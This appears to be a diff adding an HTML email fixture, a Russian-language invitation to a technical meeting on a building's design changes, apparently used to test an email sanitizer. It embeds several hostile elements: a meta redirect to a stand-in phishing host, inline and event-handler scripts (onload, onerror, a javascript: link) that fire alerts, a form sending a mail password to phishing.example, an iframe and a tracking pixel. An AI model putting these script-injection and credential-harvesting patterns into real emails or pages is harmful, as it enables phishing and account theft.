@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="refresh" content="0; url=https://phishing.example/login" />
+    <title>Приглашение на техническое совещание</title>
+    <style>
+      .wrap {
+        max-width: 640px;
+        margin: 0 auto;
+        font-family: Arial, sans-serif;
+        color: #1d2733;
+      }
+      .hero {
+        background: #eef3f9;
+        border-radius: 10px;
+        padding: 18px 20px;
+      }
+      .hero h2 {
+        margin: 0 0 6px;
+        font-size: 18px;
+        color: #1f3a5f;
+      }
+      table.agenda {
+        border-collapse: collapse;
+        width: 100%;
+        margin: 14px 0;
+        font-size: 14px;
+      }
+      table.agenda td {
+        border-bottom: 1px solid #dde3ea;
+        padding: 7px 4px;
+        vertical-align: top;
+      }
+      .btn {
+        display: inline-block;
+        background: #1f3a5f;
+        color: #fff !important;
+        text-decoration: none;
+        padding: 9px 16px;
+        border-radius: 8px;
+      }
+      .muted {
+        color: #6b7785;
+        font-size: 12px;
+      }
+    </style>
+    <script>
+      document.title = 'взлом';
+      alert('XSS из письма');
+    </script>
+  </head>
+  <body onload="alert('onload')">
+    <div class="wrap">
+      <p>
+        <img
+          src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAiIGhlaWdodD0iMzIiPjxyZWN0IHdpZHRoPSIxMjAiIGhlaWdodD0iMzIiIHJ4PSI2IiBmaWxsPSIjMWYzYTVmIi8+PHRleHQgeD0iNjAiIHk9IjIxIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPtCh0YLRgNC+0LnQl9Cw0LrQsNC30YfQuNC6PC90ZXh0Pjwvc3ZnPg=="
+          alt="СтройЗаказчик"
+          width="120"
+          height="32"
+        />
+      </p>
+      <p>
+        <img
+          src="https://cdn.stroyzakazchik.example/mail/banner-korpus-b.jpg"
+          alt="Корпус Б — визуализация"
+          width="640"
+          height="220"
+          style="max-width: 100%; height: auto; border-radius: 10px"
+        />
+      </p>
+      <div class="hero">
+        <h2>Приглашение на техническое совещание по корпусу Б</h2>
+        <div>
+          Уважаемая Валерия Сергеевна! Приглашаем специалистов ООО «ПассатПроект» на совещание по
+          изменениям в проектную документацию корпуса Б.
+        </div>
+      </div>
+      <table class="agenda">
+        <tr>
+          <td><b>Когда</b></td>
+          <td>в четверг, 10:00–12:00</td>
+        </tr>
+        <tr>
+          <td><b>Где</b></td>
+          <td>г. Минск, пр-т Победителей, 84, переговорная 3</td>
+        </tr>
+        <tr>
+          <td><b>Повестка</b></td>
+          <td>
+            1. Замена системы вентиляции АБК.<br />2. Сроки выдачи разделов ОВ и ЭМ.<br />3. Порядок
+            согласования изменений с экспертизой.
+          </td>
+        </tr>
+      </table>
+      <p>
+        <a class="btn" href="https://stroyzakazchik.example/meetings/korpus-b"
+          >Подтвердить участие</a
+        >
+      </p>
+      <p>
+        Материалы к совещанию:
+        <a href="https://stroyzakazchik.example/files/korpus-b-izmeneniya.pdf"
+          >перечень изменений (PDF)</a
+        >
+        · <a href="javascript:alert('ссылка-ловушка')">открыть в личном кабинете</a> ·
+        <a href="mailto:m.goncharova@stroyzakazchik.example">написать организатору</a>
+      </p>
+      <form action="https://phishing.example/collect" method="post">
+        <p>
+          Ваш пароль от почты: <input name="password" type="password" />
+          <button type="submit">Отправить</button>
+        </p>
+      </form>
+      <p><img src="x" onerror="alert('onerror')" alt="" /></p>
+      <iframe src="https://stroyzakazchik.example/embed"></iframe>
+      <p class="muted">
+        С уважением, Марина Гончарова, инженер технадзора ООО «СтройЗаказчик», +375 29 655-12-40
+      </p>
+      <img src="https://track.mailer.example/open.gif?id=passat-0942" width="1" height="1" alt="" />
+    </div>
+  </body>
+</html>
